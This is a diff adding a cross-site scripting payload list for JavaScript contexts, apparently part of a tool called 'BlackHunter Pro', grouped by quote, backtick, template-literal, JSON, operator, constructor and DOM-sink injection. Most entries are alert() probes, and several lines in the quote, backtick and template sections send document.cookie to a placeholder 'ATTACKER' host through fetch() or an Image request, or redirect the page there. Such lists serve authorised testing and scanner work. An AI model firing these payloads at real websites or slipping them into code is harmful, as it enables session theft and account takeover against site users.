@@ -1,0 +1,274 @@
+# payloads/xss/javascript.txt
+# JavaScript Context XSS Payloads
+# BlackHunter Pro
+
+# =============================================
+# SINGLE QUOTE CONTEXT (')
+# =============================================
+
+';alert(1);//
+';alert('XSS');//
+';alert(document.cookie);//
+';prompt(1);//
+';prompt('XSS');//
+';confirm(1);//
+';confirm('XSS');//
+';alert(document.domain);//
+';alert(window.location);//
+';alert(location.href);//
+';alert(document.URL);//
+';alert(String.fromCharCode(88,83,83));//
+';eval('alert(1)');//
+';Function('alert(1)')();//
+';setTimeout('alert(1)',0);//
+';setInterval('alert(1)',0);//
+';window.location='http://ATTACKER';//
+';document.location='http://ATTACKER';//
+';new Image().src='http://ATTACKER/'+document.cookie;//
+';fetch('http://ATTACKER/?c='+document.cookie);//
+';alert(/XSS/);//
+';alert`1`;//
+';alert.call(null,1);//
+';alert.apply(null,[1]);//
+
+# =============================================
+# DOUBLE QUOTE CONTEXT (")
+# =============================================
+
+";alert(1);//
+";alert('XSS');//
+";alert(document.cookie);//
+";prompt(1);//
+";prompt('XSS');//
+";confirm(1);//
+";confirm('XSS');//
+";alert(document.domain);//
+";alert(window.location);//
+";alert(location.href);//
+";alert(document.URL);//
+";alert(String.fromCharCode(88,83,83));//
+";eval('alert(1)');//
+";Function('alert(1)')();//
+";setTimeout('alert(1)',0);//
+";setInterval('alert(1)',0);//
+";window.location='http://ATTACKER';//
+";document.location='http://ATTACKER';//
+";new Image().src='http://ATTACKER/'+document.cookie;//
+";fetch('http://ATTACKER/?c='+document.cookie);//
+";alert(/XSS/);//
+";alert`1`;//
+
+# =============================================
+# BACKTICK CONTEXT (`)
+# =============================================
+
+`;alert(1);//
+`;alert('XSS');//
+`;alert(document.cookie);//
+`;prompt(1);//
+`;confirm(1);//
+`;alert(document.domain);//
+`;alert(location.href);//
+`;eval('alert(1)');//
+`;Function('alert(1)')();//
+`;setTimeout('alert(1)',0);//
+`;new Image().src='http://ATTACKER/'+document.cookie;//
+`;fetch('http://ATTACKER/?c='+document.cookie);//
+
+# =============================================
+# ESCAPED QUOTES
+# =============================================
+
+\';alert(1);//
+\";alert(1);//
+\\';alert(1);//
+\\";alert(1);//
+\\\';alert(1);//
+\\\";alert(1);//
+\\\\';alert(1);//
+\\\\";alert(1);//
+
+# =============================================
+# SCRIPT TAG BREAKING
+# =============================================
+
+</script><script>alert(1)</script>
+</script><script>alert('XSS')</script>
+</script><script>alert(document.cookie)</script>
+</script><img src=x onerror=alert(1)>
+</script><svg onload=alert(1)>
+</script><iframe src=javascript:alert(1)>
+</script><body onload=alert(1)>
+</script><input autofocus onfocus=alert(1)>
+</script>
+<script>alert(1)</script>
+</script ><script>alert(1)</script>
+</script\t><script>alert(1)</script>
+</script\n><script>alert(1)</script>
+</script/><script>alert(1)</script>
+</script><script>alert`1`</script>
+</script><script>eval('ale'+'rt(1)')</script>
+
+# =============================================
+# TEMPLATE LITERAL INJECTION
+# =============================================
+
+${alert(1)}
+${alert('XSS')}
+${alert(document.cookie)}
+${prompt(1)}
+${confirm(1)}
+${eval('alert(1)')}
+${Function('alert(1)')()}
+${setTimeout('alert(1)',0)}
+${new Image().src='http://ATTACKER/'+document.cookie}
+${fetch('http://ATTACKER/?c='+document.cookie)}
+
+# =============================================
+# JSON CONTEXT
+# =============================================
+
+"-alert(1)-"
+'-alert(1)-'
+"-alert(document.cookie)-"
+'-alert(document.cookie)-'
+"-alert(1)}//
+'-alert(1)}//
+"-alert(1)}"
+'-alert(1)}'
+
+# =============================================
+# FUNCTION CALL INJECTION
+# =============================================
+
+,alert(1)
+,alert('XSS')
+,alert(document.cookie)
+);alert(1);//
+);alert(document.cookie);//
+],alert(1),[
+],alert(document.cookie),[
+);alert(1),(
+);alert('XSS'),(
+
+# =============================================
+# OPERATOR INJECTION
+# =============================================
+
++alert(1)+
+-alert(1)-
+*alert(1)*
+/alert(1)/
+%alert(1)%
+!alert(1)!
+~alert(1)~
+&alert(1)&
+|alert(1)|
+^alert(1)^
+<alert(1)<
+>alert(1)>
+=alert(1)=
+==alert(1)==
+===alert(1)===
+&&alert(1)&&
+||alert(1)||
+
+# =============================================
+# CONSTRUCTOR INJECTION
+# =============================================
+
+constructor.constructor('alert(1)')()
+[].constructor.constructor('alert(1)')()
+''.constructor.constructor('alert(1)')()
+/./.constructor.constructor('alert(1)')()
+(0).constructor.constructor('alert(1)')()
+true.constructor.constructor('alert(1)')()
+[]['filter']['constructor']('alert(1)')()
+[]['map']['constructor']('alert(1)')()
+[]['sort']['constructor']('alert(1)')()
+[]['fill']['constructor']('alert(1)')()
+[]['find']['constructor']('alert(1)')()
+[]['concat']['constructor']('alert(1)')()
+[]['slice']['constructor']('alert(1)')()
+[]['splice']['constructor']('alert(1)')()
+[]['push']['constructor']('alert(1)')()
+[]['pop']['constructor']('alert(1)')()
+[]['shift']['constructor']('alert(1)')()
+[]['unshift']['constructor']('alert(1)')()
+[]['join']['constructor']('alert(1)')()
+[]['reverse']['constructor']('alert(1)')()
+[]['reduce']['constructor']('alert(1)')()
+
+# =============================================
+# EVAL & FUNCTION CONSTRUCTOR
+# =============================================
+
+eval('alert(1)')
+eval('ale'+'rt(1)')
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+eval(atob('YWxlcnQoMSk='))
+eval(unescape('%61%6c%65%72%74%28%31%29'))
+eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))
+Function('alert(1)')()
+new Function('alert(1)')()
+new Function('a','alert(a)')('XSS')
+Function('a','alert(a)')('XSS')
+
+# =============================================
+# WINDOW OBJECT
+# =============================================
+
+window['alert'](1)
+window['alert']('XSS')
+window.alert(1)
+window.alert('XSS')
+window['eval']('alert(1)')
+window['Function']('alert(1)')()
+top['alert'](1)
+top.alert(1)
+self['alert'](1)
+self.alert(1)
+this['alert'](1)
+this.alert(1)
+parent['alert'](1)
+parent.alert(1)
+frames['alert'](1)
+globalThis['alert'](1)
+globalThis.alert(1)
+
+# =============================================
+# ALERT ALTERNATIVES
+# =============================================
+
+window.location='javascript:alert(1)'
+window.location.href='javascript:alert(1)'
+window.location.assign('javascript:alert(1)'
+window.location.replace('javascript:alert(1)'
+document.location='javascript:alert(1)'
+document.location.href='javascript:alert(1)'
+document.URL='javascript:alert(1)'
+location='javascript:alert(1)'
+location.href='javascript:alert(1)'
+location.assign('javascript:alert(1)')
+location.replace('javascript:alert(1)')
+location.hash='#javascript:alert(1)'
+document.write('<script>alert(1)</script>')
+document.writeln('<script>alert(1)</script>')
+document.body.innerHTML='<script>alert(1)</script>'
+document.body.innerHTML='<img src=x onerror=alert(1)>'
+document.documentElement.innerHTML='<script>alert(1)</script>'
+
+# =============================================
+# SVG AND DOM INJECTION
+# =============================================
+
+document.createElement('script')
+document.createElement('img')
+document.createElement('svg')
+document.createElement('iframe')
+innerHTML='<script>alert(1)</script>'
+innerHTML='<img src=x onerror=alert(1)>'
+innerHTML='<svg onload=alert(1)>'
+outerHTML='<script>alert(1)</script>'
+insertAdjacentHTML('beforeend','<script>alert(1)</script>')
+insertAdjacentHTML('afterbegin','<img src=x onerror=alert(1)>')
